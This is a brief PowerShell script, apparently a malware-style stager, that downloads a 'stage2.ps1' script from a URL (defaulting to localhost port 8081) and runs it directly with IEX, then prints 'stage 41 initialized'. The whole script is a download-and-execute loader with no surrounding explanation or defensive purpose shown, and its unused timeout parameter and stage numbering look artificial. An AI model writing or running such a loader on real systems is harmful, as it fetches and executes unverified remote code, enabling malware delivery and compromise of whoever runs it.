[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://localhost:8081/stage2.ps1',
    [int]$StageTimeout = 103
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
Write-Output "stage 41 initialized"
